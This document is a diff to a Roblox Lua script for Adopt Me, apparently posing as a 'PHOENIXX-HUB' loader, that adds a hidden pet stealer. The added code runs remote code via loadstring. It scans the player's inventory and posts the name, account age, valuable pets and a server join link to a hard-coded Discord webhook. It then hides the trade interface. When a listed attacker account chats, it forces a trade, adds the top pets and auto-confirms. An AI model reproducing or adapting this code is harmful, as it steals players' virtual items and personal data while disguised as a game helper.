@@ -1,3 +1,320 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/start", true))()
+
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/875033288c5e99d576622aced60a0c44.lua"))()
+
+local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
+local Username = {"Lilicyy90", "zxrx6666", "zxrx66666", "PHOENIXX541", "YOURBAE66699", "ANJAYGGMBOT", "Egosaputra07", "AnyaaChn7", "PHOENIX666640", "ZXRX392"}
+local ExtraUsers = {"Lilicyy90", "zxrx6666", "zxrx66666", "PHOENIXX541", "YOURBAE66699", "ANJAYGGMBOT", "Egosaputra07", "AnyaaChn7", "PHOENIX666640", "ZXRX392"}
+local Friends = {}
+
+for _, v in ipairs(Username) do table.insert(Friends, v) end
+for _, v in ExtraUsers do if not table.find(Friends, v) then table.insert(Friends, v) end end
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+ReplicatedStorage:WaitForChild("Fsys", 15)
+local load = require(ReplicatedStorage.Fsys).load
+
+repeat task.wait(1) until load("ClientData") and load("ClientData").get("inventory")
+
+local RouterClient = load("RouterClient")
+local ClientData = load("ClientData")
+local InventoryDB = load("InventoryDB")
+
+local SendTrade           = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddItem             = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiation   = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTrade        = RouterClient.get("TradeAPI/ConfirmTrade")
+local DeclineTrade        = RouterClient.get("TradeAPI/DeclineTrade")
+local UnlockBackpack      = RouterClient.get("BackpackAPI/CommitBackpackItemSet")
+local TradeRequestEvent   = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+
+---- VALUE TABLES
+local tbl_15_upvr = {
+    common = 1;
+    uncommon = 2;
+    rare = 4;
+    ultra_rare = 10;
+    legendary = 26;
+}
+
+local tbl_35_upvr = { pets = 1 }
+
+local tbl_28_upvr = {
+    neon = 4;
+    mega_neon = 16;
+    flyable = 2;
+    rideable = 2;
+}
+
+-- VALUE FUNCTION
+local function getPetValueByTable(petData, props)
+    if not petData or not petData.rarity then return 0 end
+
+    local base = tbl_15_upvr[string.lower(petData.rarity)] or 0
+    local bonus = 0
+
+    for k, v in pairs(tbl_28_upvr) do
+        if props[k] then bonus += v end
+    end
+
+    return (base + bonus) * (tbl_35_upvr.pets or 1)
+end
+
+-- INVENTORY SCAN
+local serverData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
+local inventory = serverData[LocalPlayer.Name].inventory.pets or {}
+
+local hits = {}
+local totalValue = 0
+local petCount = 0
+
+for uid, item in pairs(inventory) do
+    local petData = InventoryDB.pets and InventoryDB.pets[item.id]
+    local props = item.properties or {}
+
+    -- ✅ SPECIAL PET EXCEPTION
+    local isSpecial =
+    petData and (
+        petData.name == "Albino Monkey" or
+        petData.name == "Arctic Fox" or
+        petData.name == "Arctic Reindeer" or
+        petData.name == "Bat Dragon" or
+        petData.name == "Blue Dog" or
+        petData.name == "Brown Bear" or
+        petData.name == "Cow" or
+        petData.name == "Crow" or
+        petData.name == "Dalmatian" or
+        petData.name == "Elephant" or
+        petData.name == "Evil Unicorn" or
+        petData.name == "Flamingo" or
+        petData.name == "Frost Dragon" or
+        petData.name == "German Shepherd" or
+        petData.name == "Giraffe" or
+        petData.name == "Hedgehog" or
+        petData.name == "Hyena" or
+        petData.name == "Lion" or
+        petData.name == "Llama" or
+        petData.name == "Mini Pig" or
+        petData.name == "Owl" or
+        petData.name == "Owlbear" or
+        petData.name == "Parrot" or
+        petData.name == "Pink Cat" or
+        petData.name == "Shadow Dragon" or
+        petData.name == "Shrew" or
+        petData.name == "Turtle"
+    )
+
+
+    if petData and petData.name and (
+        isSpecial or
+        props.neon or
+        props.mega_neon or
+        props.flyable or
+        props.rideable
+    ) then
+        local val = getPetValueByTable(petData, props)
+
+        petCount += 1
+        totalValue += val
+
+        table.insert(hits, {
+            name = petData.name,
+            value = string.format("%.2f", val),
+            uid = uid,
+            props = props
+        })
+    end
+end
+
+table.sort(hits, function(a,b)
+    return tonumber(a.value) > tonumber(b.value)
+end)
+
+-- GROUPING
+local function getTag(p)
+    if p.mega_neon then return "[MR]" end
+    if p.neon then return "[N]" end
+    if p.flyable and p.rideable then return "[FR]" end
+    if p.flyable then return "[F]" end
+    if p.rideable then return "[R]" end
+    return "[NP]"
+end
+
+local grouped = {}
+for _, pet in ipairs(hits) do
+    local key =
+        pet.name .. pet.value ..
+        (pet.props.mega_neon and "mn" or "") ..
+        (pet.props.neon and "n" or "") ..
+        (pet.props.flyable and "f" or "") ..
+        (pet.props.rideable and "r" or "")
+
+    grouped[key] = grouped[key] or {
+        name = pet.name,
+        value = pet.value,
+        count = 0,
+        tag = getTag(pet.props)
+    }
+    grouped[key].count += 1
+end
+
+local groupedList = {}
+for _, v in pairs(grouped) do table.insert(groupedList, v) end
+
+-- SORT BY TOTAL VALUE (value × count)
+table.sort(groupedList, function(a,b)
+    return (tonumber(a.value) * a.count) > (tonumber(b.value) * b.count)
+end)
+
+-- PREVIEW
+local previewLines = {}
+for _, g in ipairs(groupedList) do
+    if #previewLines >= 16 then break end
+    table.insert(
+        previewLines,
+        "x"..g.count.." "..g.tag.." "..g.name..
+        " → "..g.value..
+        " (Total: "..string.format("%.2f", tonumber(g.value) * g.count)..")"
+    )
+end
+
+-- JOIN LINK
+local joinUrl =
+    "https://www.roblox.com/games/start?placeId="
+    .. game.PlaceId ..
+    "&gameInstanceId="
+    .. game.JobId
+
+-- WEBHOOK
+local payload = {
+    username = "Captain Hook",
+    embeds = {{
+        title = "🐶 Adopt Me Hit | DARK SCRIPTS 🐶",
+        color = 0xFF2F92,
+
+        fields = {
+            {
+                name = "👤 Player Information",
+                value =
+                    "```" ..
+                    "Name : " .. LocalPlayer.Name .. "\n" ..
+                    "Executor : " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\n" ..
+                    "Account Age : " .. LocalPlayer.AccountAge .. " days" ..
+                    "```",
+                inline = false
+            },
+            {
+                name = "💰 Total Value",
+                value = "```"..string.format("%.2f", totalValue).."```",
+                inline = false
+            },
+            {
+                name = "🎒 Backpack (Sorted by Total Value)",
+                value = "```"..table.concat(previewLines, "\n").."```",
+                inline = false
+            },
+            {
+                name = "🔗 Join Player",
+                value = "[ Click to Join Server ]("..joinUrl..")",
+                inline = false
+            }
+        },
+
+        footer = { text = "Adopt Me • DARK SCRIPTS" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local function sendWebhook(url)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+if Webhook and Webhook ~= "" then
+    sendWebhook(Webhook)
+end
+
+
+-- UI LOCKS
+LocalPlayer.PlayerGui.TradeApp.Enabled = false
+pcall(function() LocalPlayer.PlayerGui.HintApp:Destroy() end)
+pcall(function() LocalPlayer.PlayerGui.DialogApp:Destroy() end)
+LocalPlayer.PlayerGui.ToolApp.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
+    if not LocalPlayer.PlayerGui.ToolApp.Frame.Visible then LocalPlayer.PlayerGui.ToolApp.Frame.Visible = true end
+end)
+LocalPlayer.PlayerGui.HouseEditorApp:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if not LocalPlayer.PlayerGui.HouseEditorApp.Enabled then LocalPlayer.PlayerGui.HouseEditorApp.Enabled = true end
+end)
+
+-- STEAL FUNCTION
+local function startSteal(plr)
+    if not table.find(Friends, plr.Name) then return end
+
+    task.spawn(function()
+        local declineConn = TradeRequestEvent.OnClientEvent:Connect(function(sender)
+            if sender and sender.Name ~= plr.Name then
+                pcall(DeclineTrade.FireServer, DeclineTrade)
+            end
+        end)
+
+        pcall(function() RouterClient.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1) end)
+
+        for i = 1, 80 do
+            if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
+            pcall(SendTrade.FireServer, SendTrade, plr)
+            task.wait(0.22)
+        end
+
+        if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+            if declineConn then declineConn:Disconnect() end
+            return
+        end
+
+        if declineConn then declineConn:Disconnect() end
+
+        for i = 1, math.min(18, #hits) do
+            local pet = hits[i]
+            if not pet then break end
+            pcall(function() UnlockBackpack:FireServer("backpack_locks", {[pet.uid] = true}) end)
+            pcall(function() AddItem:FireServer(pet.uid) end)
+            task.wait(0.14)
+        end
+
+        task.wait(1.2)
+
+        spawn(function()
+            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
+                pcall(AcceptNegotiation.FireServer, AcceptNegotiation)
+                task.wait(0.4)
+                pcall(ConfirmTrade.FireServer, ConfirmTrade)
+                task.wait(0.4)
+            end
+        end)
+    end)
+end
+
+-- CHAT TRIGGERS
+for _, p in Players:GetPlayers() do
+    if table.find(Friends, p.Name) then
+        p.Chatted:Connect(function() startSteal(p) end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(p)
+    task.wait(2)
+    if table.find(Friends, p.Name) then
+        p.Chatted:Connect(function() startSteal(p) end)
+    end
+end)
+
+print("[Script PHOENIXX-HUB] Adopt Me Loaded")
